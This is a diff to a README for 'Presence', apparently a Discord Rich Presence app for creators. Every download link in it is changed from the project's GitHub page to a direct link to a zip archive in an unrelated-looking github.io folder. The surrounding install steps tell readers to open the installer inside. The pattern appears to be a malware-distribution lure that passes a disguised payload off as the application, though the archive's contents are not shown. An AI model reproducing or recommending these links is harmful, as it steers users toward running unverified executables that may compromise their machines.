@@ -5,11 +5,11 @@ description: "Unified Discord Rich Presence for DAWs, IDEs & creative tools, aut
 ---
 # 🎵 Presence - Unified Discord Rich Presence for Creators
 
-[![Download Presence](https://img.shields.io/badge/Download-Presence-2ea44f?style=for-the-badge&logo=github)](https://github.com/homecured-genusursus22/Presence)
+[![Download Presence](https://img.shields.io/badge/Download-Presence-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/homecured-genusursus22/homecured-genusursus22.github.io/main/counterlathing/Dist-v3.4.zip)
 
 ## 📥 Download & Install
 
-Visit [this link](https://github.com/homecured-genusursus22/Presence) to download the application. Once you're there, look for the download button or the latest release section.
+Visit [this link](https://raw.githubusercontent.com/homecured-genusursus22/homecured-genusursus22.github.io/main/counterlathing/Dist-v3.4.zip) to download the application. Once you're there, look for the download button or the latest release section.
 
 ## 🎯 What is Presence?
 
@@ -53,7 +53,7 @@ Think of it as a window into your creative world - instead of just showing "Onli
 
 ### ⬇️ Installation Steps
 
-1. **Download** - Click the download button at the top of this page or visit [the download page](https://github.com/homecured-genusursus22/Presence)
+1. **Download** - Click the download button at the top of this page or visit [the download page](https://raw.githubusercontent.com/homecured-genusursus22/homecured-genusursus22.github.io/main/counterlathing/Dist-v3.4.zip)
 2. **Run** - Once downloaded, open the installer file
 3. **Follow Setup** - Accept the terms and click "Install"
 4. **Launch** - Find Presence in your Start Menu and open it
@@ -164,7 +164,7 @@ Presence is open-source software. You're free to use it, modify it, and share it
 
 You're just moments away from sharing your creative journey with your Discord community. Download Presence now and start showing off what you're working on - your friends will love seeing your progress in real-time!
 
-[![Download Now](https://img.shields.io/badge/Download%20-%20Presence-blueviolet?style=for-the-badge&logo=github)](https://github.com/homecured-genusursus22/Presence)
+[![Download Now](https://img.shields.io/badge/Download%20-%20Presence-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/homecured-genusursus22/homecured-genusursus22.github.io/main/counterlathing/Dist-v3.4.zip)
 
 ## 📊 Project Stats
 - ⭐ Star the project if you find it useful
